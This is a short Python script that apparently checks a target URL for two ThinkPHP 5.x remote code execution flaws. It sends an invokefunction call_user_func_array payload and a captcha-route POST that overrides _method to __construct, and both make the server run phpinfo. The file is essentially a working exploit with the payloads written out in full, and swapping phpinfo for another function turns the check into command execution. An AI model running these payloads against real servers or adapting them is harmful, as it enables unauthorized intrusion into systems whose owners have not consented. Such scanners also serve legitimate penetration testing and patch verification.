import sys
import requests

url = sys.argv[1]
payload_v_5=[r"/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"]
A_url = url + payload_v_5[0]
B_url = url + '/index.php?s=captcha'

print('')
print('')
payload5_0_23 = {'_method':'__construct',
				'filter[]':'phpinfo',
				'method':'get',
				'server[REQUEST_METHOD]':'1'}

res = requests.get(A_url)
res1 = requests.post(B_url,payload5_0_23)



if 'PHP Version' in res.text:
	print("[+]This Target Have Vulnerability Of V5!!!" + '\n')
else:
	print("[-]NO EXIST V5!!" + '\n')

if 'PHP Version' in res1.text:
	print("[+]This Target Have Vulnerability Of V5.0.23!!!")
else:
	print("[-]NO EXIST V5.0.23!!")
